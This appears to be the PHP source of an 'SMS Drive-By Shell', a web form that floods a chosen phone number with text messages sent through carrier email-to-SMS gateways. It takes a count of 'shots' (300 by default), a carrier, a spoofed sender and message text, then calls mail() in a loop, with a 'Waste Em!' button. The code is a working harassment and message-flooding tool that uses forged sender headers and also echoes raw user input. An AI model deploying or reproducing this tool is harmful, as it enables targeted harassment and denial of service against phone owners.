<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <SCRIPT language=Javascript>
      <!--
      function isNumberKey(evt)
      {
         var charCode = (evt.which) ? evt.which : event.keyCode
         if (charCode > 31 && (charCode < 48 || charCode > 57))
            return false;
         return true;
      }
	  eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return 
r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3(7.X){7["R"+a]=a;7["z"+a]=6(){7["R"+a](7.1k)};7.X("1e",7["z"+a])}E{7.19("z",a,15)}2 j=H V();6 a(){2 e=q.1d("1a");3(e){o(e,"P");2 
N=B(q,"*","14");3((e.12<=10)||(N=="")){c(e,"P",d)}}4=B(q,"*","1n");k(i=0;i<4.b;i++){3(4[i].F=="1g"||4[i].F=="1f"||4[i].F=="1c"){4[i].1b=6(){r();c(v.5.5,"f",d)};4[i].O=6(){r();c(v.5.5,"f",d)};j.D(j.b,0,4[i])}E{4[i].O=6(){r();c(v.5.5,"f",d)};4[i].18=6(){o(v.5.5,"f")}}}2 
C=17.16.13();2 A=q.M("11");3(C.K("J")+1){c(A[0],"J",d)}3(C.K("I")+1){c(A[0],"I",d)}}6 r(){k(2 i=0;i<j.b;i++){o(j[i].5.5,"f")}}6 B(m,y,w){2 x=(y=="*"&&m.Y)?m.Y:m.M(y);2 G=H V();w=w.1m(/\\-/g,"\\\\-");2 L=H 1l("(^|\\\\s)"+w+"(\\\\s|$)");2 n;k(2 
i=0;i<x.b;i++){n=x[i];3(L.1j(n.8)){G.1i(n)}}1h(G)}6 o(p,T){3(p.8){2 h=p.8.Z(" ");2 U=T.t();k(2 i=0;i<h.b;i++){3(h[i].t()==U){h.D(i,1);i--}}p.8=h.S(" ")}}6 c(l,u,Q){3(l.8){2 9=l.8.Z(" ");3(Q){2 W=u.t();k(2 
i=0;i<9.b;i++){3(9[i].t()==W){9.D(i,1);i--}}}9[9.b]=u;l.8=9.S(" 
")}E{l.8=u}}',62,86,'||var|if|elements|parentNode|function|window|className|_16|initialize|length|addClassName|true|_1|highlighted||_10||el_array|for|_13|_6|_c|removeClassName|_e|document|safari_reset||toUpperCase|_14|this|_8|_9|_7|load|_4|getElementsByClassName|_3|splice|else|type|_a|new|firefox|safari|indexOf|_b|getElementsByTagName|_2|onfocus|no_guidelines|_15|event_load|join|_f|_11|Array|_17|attachEvent|all|split|450|body|offsetWidth|toLowerCase|guidelines|false|userAgent|navigator|onblur|addEventListener|main_body|onclick|file|getElementById|onload|radio|checkbox|return|push|test|event|RegExp|replace|element'.split('|'),0,{}))
      //-->
   </SCRIPT>
   <style type="text/css">
   body
{
	background:#fffff;
	font-family:"Lucida Grande", Tahoma, Arial, Verdana, sans-serif;
	font-size:small;
	margin:8px 0 16px;
	text-align:center;
}
#form_container
{
	background:#fff;
	border:1px solid #ccc;
	margin:0 auto;
	text-align:left;
	width:640px;
}
#top
{
	display:block;
	height:10px;
	margin:10px auto 0;
	width:650px;
}
#footer
{
	width:640px;
	clear:both;
	color:#999999;
	text-align:center;
	width:640px;
	padding-bottom: 15px;
	font-size: 85%;
}
#footer a{
	color:#999999;
	text-decoration: none;
	border-bottom: 1px dotted #999999;
}
#bottom
{
	display:block;
	height:10px;
	margin:0 auto;
	width:650px;
}
form.appnitro
{
	margin:20px 20px 0;
	padding:0 0 20px;
}
/**** Logo Section  *****/
h1
{
	background-color:#dedede;
	margin:0;
	min-height:0;
	padding:0;
	text-decoration:none;
	text-indent:-8000px;
	
}
h1 a
{
	
	display:block;
	height:100%;
	min-height:40px;
	overflow:hidden;
}
img
{
	behavior:url(css/iepngfix.htc);
	border:none;
}
/**** Form Section ****/
.appnitro
{
	font-family:Lucida Grande, Tahoma, Arial, Verdana, sans-serif;
	font-size:small;
}
.appnitro li
{
	width:61%;
}
form ul
{
	font-size:100%;
	list-style-type:none;
	margin:0;
	padding:0;
	width:100%;
}
form li
{
	display:block;
	margin:0;
	padding:4px 5px 2px 9px;
	position:relative;
}
form li:after
{
	clear:both;
	content:".";
	display:block;
	height:0;
	visibility:hidden;
}
.buttons:after
{
	clear:both;
	content:".";
	display:block;
	height:0;
	visibility:hidden;
}
.buttons
{
	clear:both;
	display:block;
	margin-top:10px;
}
* html form li
{
	height:1%;
}
* html .buttons
{
	height:1%;
}
* html form li div
{
	display:inline-block;
}
form li div
{
	color:#444;
	margin:0 4px 0 0;
	padding:0 0 8px;
}
form li span
{
	color:#444;
	float:left;
	margin:0 4px 0 0;
	padding:0 0 8px;
}
form li div.left
{
	display:inline;
	float:left;
	width:48%;
}
form li div.right
{
	display:inline;
	float:right;
	width:48%;
}
form li div.left .medium
{
	width:100%;
}
form li div.right .medium
{
	width:100%;
}
.clear
{
	clear:both;
}
form li div label
{
	clear:both;
	color:#444;
	display:block;
	font-size:9px;
	line-height:9px;
	margin:0;
	padding-top:3px;
}
form li span label
{
	clear:both;
	color:#444;
	display:block;
	font-size:9px;
	line-height:9px;
	margin:0;
	padding-top:3px;
}
form li .datepicker
{
	cursor:pointer !important;
	float:left;
	height:16px;
	margin:.1em 5px 0 0;
	padding:0;
	width:16px;
}
.form_description
{
	border-bottom:1px dotted #ccc;
	clear:both;
	display:inline-block;
	margin:0 0 1em;
}
.form_description[class]
{
	display:block;
}
.form_description h2
{
	clear:left;
	font-size:160%;
	font-weight:400;
	margin:0 0 3px;
}
.form_description p
{
	font-size:95%;
	line-height:130%;
	margin:0 0 12px;
}
form hr
{
	display:none;
}
form li.section_break
{
	border-top:1px dotted #ccc;
	margin-top:9px;
	padding-bottom:0;
	padding-left:9px;
	padding-top:13px;
	width:97% !important;
}
form ul li.first
{
	border-top:none !important;
	margin-top:0 !important;
	padding-top:0 !important;
}
form .section_break h3
{
	font-size:110%;
	font-weight:400;
	line-height:130%;
	margin:0 0 2px;
}
form .section_break p
{
	font-size:85%;
	margin:0 0 10px;
}
/**** Buttons ****/
input.button_text
{
	overflow:visible;
	padding:0 7px;
	width:auto;
}
.buttons input
{
	font-size:120%;
	margin-right:5px;
}
/**** Inputs and Labels ****/
label.description
{
	border:none;
	color:#222;
	display:block;
	font-size:95%;
	font-weight:700;
	line-height:150%;
	padding:0 0 1px;
}
span.symbol
{
	font-size:115%;
	line-height:130%;
}
input.text
{
	background:#fff;
	border-bottom:1px solid #ddd;
	border-left:1px solid #c3c3c3;
	border-right:1px solid #c3c3c3;
	border-top:1px solid #7c7c7c;
	color:#333;
	font-size:100%;
	margin:0;
	padding:2px 0;
}
input.file
{
	color:#333;
	font-size:100%;
	margin:0;
	padding:2px 0;
}
textarea.textarea
{
	background:#fff;
	border-bottom:1px solid #ddd;
	border-left:1px solid #c3c3c3;
	border-right:1px solid #c3c3c3;
	border-top:1px solid #7c7c7c;
	color:#333;
	font-family:"Lucida Grande", Tahoma, Arial, Verdana, sans-serif;
	font-size:100%;
	margin:0;
	width:99%;
}
select.select
{
	color:#333;
	font-size:100%;
	margin:1px 0;
	padding:1px 0 0;
	background:#fff repeat-x top;
	border-bottom:1px solid #ddd;
	border-left:1px solid #c3c3c3;
	border-right:1px solid #c3c3c3;
	border-top:1px solid #7c7c7c;
}
input.currency
{
	text-align:right;
}
input.checkbox
{
	display:block;
	height:13px;
	line-height:1.4em;
	margin:6px 0 0 3px;
	width:13px;
}
input.radio
{
	display:block;
	height:13px;
	line-height:1.4em;
	margin:6px 0 0 3px;
	width:13px;
}
label.choice
{
	color:#444;
	display:block;
	font-size:100%;
	line-height:1.4em;
	margin:-1.55em 0 0 25px;
	padding:4px 0 5px;
	width:90%;
}
select.select[class]
{
	margin:0;
	padding:1px 0;
}
*:first-child+html select.select[class]
{
	margin:1px 0;
}
.safari select.select
{
	font-size:120% !important;
	margin-bottom:1px;
}
input.small
{
	width:25%;
}
select.small
{
	width:25%;
}
input.medium
{
	width:50%;
}
select.medium
{
	width:50%;
}
input.large
{
	width:99%;
}
select.large
{
	width:100%;
}
textarea.small
{
	height:5.5em;
}
textarea.medium
{
	height:10em;
}
textarea.large
{
	height:20em;
}
/**** Errors ****/
#error_message
{
	background:#fff;
	border:1px dotted red;
	margin-bottom:1em;
	padding-left:0;
	padding-right:0;
	padding-top:4px;
	text-align:center;
	width:99%;
}
#error_message_title
{
	color:#DF0000;
	font-size:125%;
	margin:7px 0 5px;
	padding:0;
}
#error_message_desc
{
	color:#000;
	font-size:100%;
	margin:0 0 .8em;
}
#error_message_desc strong
{
	background-color:#FFDFDF;
	color:red;
	padding:2px 3px;
}
form li.error
{
	background-color:#FFDFDF !important;
	border-bottom:1px solid #EACBCC;
	border-right:1px solid #EACBCC;
	margin:3px 0;
}
form li.error label
{
	color:#DF0000 !important;
}
form p.error
{
	clear:both;
	color:red;
	font-size:10px;
	font-weight:700;
	margin:0 0 5px;
}
form .required
{
	color:red;
	float:none;
	font-weight:700;
}
/**** Guidelines and Error Highlight ****/
form li.highlighted
{
	background-color:#fff7c0;
}
form .guidelines
{
	background:#f5f5f5;
	border:1px solid #e6e6e6;
	color:#444;
	font-size:80%;
	left:100%;
	line-height:130%;
	margin:0 0 0 8px;
	padding:8px 10px 9px;
	position:absolute;
	top:0;
	visibility:hidden;
	width:42%;
	z-index:1000;
}
form .guidelines small
{
	font-size:105%;
}
form li.highlighted .guidelines
{
	visibility:visible;
}
form li:hover .guidelines
{
	visibility:visible;
}
.no_guidelines .guidelines
{
	display:none !important;
}
.no_guidelines form li
{
	width:97%;
}
.no_guidelines li.section
{
	padding-left:9px;
}
/*** Success Message ****/
.form_success 
{
	clear: both;
	margin: 0;
	padding: 90px 0pt 100px;
	text-align: center
}
.form_success h2 {
    clear:left;
    font-size:160%;
    font-weight:normal;
    margin:0pt 0pt 3px;
}
/*** Password ****/
ul.password{
    margin-top:60px;
    margin-bottom: 60px;
    text-align: center;
}
.password h2{
    color:#DF0000;
    font-weight:bold;
    margin:0pt auto 10px;
}
.password input.text {
   font-size:170% !important;
   width:380px;
   text-align: center;
}
.password label{
   display:block;
   font-size:120% !important;
   padding-top:10px;
   font-weight:bold;
}
#li_captcha{
   padding-left: 5px;
}
#li_captcha span{
	float:none;
}
/** Embedded Form **/
.embed #form_container{
	border: none;
}
.embed #top, .embed #bottom, .embed h1{
	display: none;
}
.embed #form_container{
	width: 100%;
}
.embed #footer{
	text-align: left;
	padding-left: 10px;
	width: 99%;
}
.embed #footer.success{
	text-align: center;
}
.embed form.appnitro
{
	margin:0px 0px 0;
	
}
/*** Calendar **********************/
div.calendar { position: relative; }
.calendar table {
cursor:pointer;
border:1px solid #ccc;
font-size: 11px;
color: #000;
background: #fff;
font-family:"Lucida Grande", Tahoma, Arial, Verdana, sans-serif;
}
.calendar .button { 
text-align: center;    
padding: 2px;          
}
.calendar .nav {
background:#f5f5f5;
}
.calendar thead .title { 
font-weight: bold;      
text-align: center;
background: #dedede;
color: #000;
padding: 2px 0 3px 0;
}
.calendar thead .headrow { 
background: #f5f5f5;
color: #444;
font-weight:bold;
}
.calendar thead .daynames { 
background: #fff;
color:#333;
font-weight:bold;
}
.calendar thead .name { 
border-bottom: 1px dotted #ccc;
padding: 2px;
text-align: center;
color: #000;
}
.calendar thead .weekend { 
color: #666;
}
.calendar thead .hilite { 
background-color: #444;
color: #fff;
padding: 1px;
}
.calendar thead .active { 
background-color: #d12f19;
color:#fff;
padding: 2px 0px 0px 2px;
}
.calendar tbody .day { 
width:1.8em;
color: #222;
text-align: right;
padding: 2px 2px 2px 2px;
}
.calendar tbody .day.othermonth {
font-size: 80%;
color: #bbb;
}
.calendar tbody .day.othermonth.oweekend {
color: #fbb;
}
.calendar table .wn {
padding: 2px 2px 2px 2px;
border-right: 1px solid #000;
background: #666;
}
.calendar tbody .rowhilite td {
background: #FFF1AF;
}
.calendar tbody .rowhilite td.wn {
background: #FFF1AF;
}
.calendar tbody td.hilite { 
padding: 1px 1px 1px 1px;
background:#444 !important;
color:#fff !important;
}
.calendar tbody td.active { 
color:#fff;
background: #529214 !important;
padding: 2px 2px 0px 2px;
}
.calendar tbody td.selected { 
font-weight: bold;
border: 1px solid #888;
padding: 1px 1px 1px 1px;
background: #f5f5f5 !important;
color: #222 !important;
}
.calendar tbody td.weekend { 
color: #666;
}
.calendar tbody td.today { 
font-weight: bold;
color: #529214;
background:#D9EFC2;
}
.calendar tbody .disabled { color: #999; }
.calendar tbody .emptycell { 
visibility: hidden;
}
.calendar tbody .emptyrow { 
display: none;
}
.calendar tfoot .footrow { 
text-align: center;
background: #556;
color: #fff;
}
.calendar tfoot .ttip { 
background: #222;
color: #fff;
font-size:10px;
border-top: 1px solid #dedede;
padding: 3px;
}
.calendar tfoot .hilite { 
background: #aaf;
border: 1px solid #04f;
color: #000;
padding: 1px;
}
.calendar tfoot .active { 
background: #77c;
padding: 2px 0px 0px 2px;
}
.calendar .combo {
position: absolute;
display: none;
top: 0px;
left: 0px;
width: 4em;
border: 1px solid #ccc;
background: #f5f5f5;
color: #222;
font-size: 90%;
z-index: 100;
}
.calendar .combo .label,
.calendar .combo .label-IEfix {
text-align: center;
padding: 1px;
}
.calendar .combo .label-IEfix {
width: 4em;
}
.calendar .combo .hilite {
background: #444;
color:#fff;
}
.calendar .combo .active {
border-top: 1px solid #999;
border-bottom: 1px solid #999;
background: #dedede;
font-weight: bold;
}
   </style>
   </title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>NDB SMS Drive-By Shell</title>
</head>
<body id="main_body" >
	
	<div id="form_container">
		<form id="form_222378" class="appnitro"  method="post" action="">
					<div class="form_description">
			<h2>NDB SMS Drive-by Shell</h2>
			<p>Pew Pew Pew Pew</p>
		</div>						
		<ul >
			<li id="li_2" >
			<label class="description" for="shots">Shots </label>
			<div>
				<input id="element_2" name="shots" class="element text small" type="text" maxlength="255" value="300" onkeypress="return isNumberKey(event)"/> 
			</div> 
			</li>	
		<li id="li_5" >
		<label class="description" for="number">Phone Number </label>
		<div>
		<input id="element_1" name="number" class="element text small" type="text" maxlength="10" value="" onkeypress="return isNumberKey(event)"/> 
		<select class="element select medium" id="element_5" name="provider"> 
<option value="@sms.3rivers.net">3 River Wireless</option>
<option value="@paging.acswireless.com">ACS Wireless</option>
<option value="@message.alltel.com">Alltel</option>
<option value="@txt.att.net">AT&amp;T</option>
<option value="@txt.bellmobility.ca">Bell Canada</option>
<option value="@bellmobility.ca">Bell Canada</option>
<option value="@txt.bell.ca">Bell Mobility (Canada)</option>
<option value="@txt.bellmobility.ca">Bell Mobility</option>
<option value="@blueskyfrog.com">Blue Sky Frog</option>
<option value="@sms.bluecell.com">Bluegrass Cellular</option>
<option value="@myboostmobile.com">Boost Mobile</option>
<option value="@bplmobile.com">BPL Mobile</option>
<option value="@cwwsms.com">Carolina West Wireless</option>
<option value="@mobile.celloneusa.com">Cellular One</option>
<option value="@csouth1.com">Cellular South</option>
<option value="@cwemail.com">Centennial Wireless</option>
<option value="@messaging.centurytel.net">CenturyTel</option>
<option value="@txt.att.net">Cingular (Now AT&T)</option>
<option value="@msg.clearnet.com">Clearnet</option>
<option value="@comcastpcs.textmsg.com">Comcast</option>
<option value="@corrwireless.net">Corr Wireless Communications</option>
<option value="@mobile.dobson.net">Dobson</option>
<option value="@sms.edgewireless.com">Edge Wireless</option>
<option value="@fido.ca">Fido</option>
<option value="@sms.goldentele.com">Golden Telecom</option>
<option value="@txt.voice.google.com">Google Voice</option>
<option value="@messaging.sprintpcs.com">Helio</option>
<option value="@text.houstoncellular.net">Houston Cellular</option>
<option value="@ideacellular.net">Idea Cellular</option>
<option value="@ivctext.com">Illinois Valley Cellular</option>
<option value="@inlandlink.com">Inland Cellular Telephone</option>
<option value="@pagemci.com">MCI</option>
<option value="@page.metrocall.com">Metrocall</option>
<option value="@my2way.com">Metrocall 2-way</option>
<option value="@mymetropcs.com">Metro PCS</option>
<option value="@fido.ca">Microcell</option>
<option value="@clearlydigital.com">Midwest Wireless</option>
<option value="@mobilecomm.net">Mobilcomm</option>
<option value="@text.mtsmobility.com">MTS</option>
<option value="@messaging.nextel.com">Nextel</option>
<option value="@onlinebeep.net">OnlineBeep</option>
<option value="@pcsone.net">PCS One</option>
<option value="@txt.bell.ca">Presidents Choice</option>
<option value="@sms.pscel.com">Public Service Cellular</option>
<option value="@qwestmp.com">Qwest</option>
<option value="@pcs.rogers.com">Rogers AT&T Wireless</option>
<option value="@pcs.rogers.com">Rogers Canada</option>
<option value="@pageme@satellink.net">Satellink</option>
<option value="@email.swbw.com">Southwestern Bell</option>
<option value="@messaging.sprintpcs.com">Sprint</option>
<option value="@tms.suncom.com">Sumcom</option>
<option value="@mobile.surewest.com">Surewest Communicaitons</option>
<option value="@tmomail.net">T-Mobile</option>
<option value="@msg.telus.com">Telus</option>
<option value="@txt.att.net">Tracfone</option>
<option value="@tms.suncom.com">Triton</option>
<option value="@utext.com">Unicel</option>
<option value="@email.uscc.net">US Cellular</option>
<option value="@txt.bell.ca">Solo Mobile</option>
<option value="@messaging.sprintpcs.com">Sprint</option>
<option value="@tms.suncom.com">Sumcom</option>
<option value="@mobile.surewest.com">Surewest Communicaitons</option>
<option value="@tmomail.net">T-Mobile</option>
<option value="@msg.telus.com">Telus</option>
<option value="@tms.suncom.com">Triton</option>
<option value="@utext.com">Unicel</option>
<option value="@email.uscc.net">US Cellular</option>
<option value="@uswestdatamail.com">US West</option>
<option value="@vtext.com">Verizon</option>
<option value="@vmobl.com">Virgin Mobile</option>
<option value="@vmobile.ca">Virgin Mobile Canada</option>
<option value="@sms.wcc.net">West Central Wireless</option>
<option value="@cellularonewest.com">Western Wireless</option>
		</select>
		</div> 
		</li>		
		<li id="li_2" >
		<label class="description" for="sender">Sender </label>
		<div>
			<input id="element_2" name="sender" class="element text medium" type="text" maxlength="255" value=""/> 
		</div> 
		</li>		
		<li id="li_4" >
		<label class="description" for="subject">Subject </label>
		<div>
			<input id="element_4" name="subject" class="element text large" type="text" maxlength="255" value=""/> 
		</div> 
		</li>		
		<li id="li_3" >
		<label class="description" for="msg">Message </label>
		<div>
			<textarea id="element_3" name="msg" class="element textarea small"></textarea> 
		</div> 
		</li>
			
					<li class="buttons">
			    
				<input id="saveForm" class="button_text" type="submit" name="submit" value="Waste Em!" />
		</li>
			</ul>
		</form>	
		<div id="footer">
			Coded by TheMongler for <a href="http://pl0x.org/">Clumsy</a>
		</div>
	</div>
	</body>
</html>

<?php
}
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	$to = $_POST['number'] . $_POST['provider'];
?>
<div>PEW PEW PEW - <?=$to?></div>

<?php
	for ($i = 0; $i < $_POST['shots']; $i++) {
		mail ( $to , $_POST['subject'] , $_POST['msg'], 'From: '. $_POST['sender'] . "\r\n" .'Reply-To: nobody@'. $_POST['provider']);
	}
}
?>
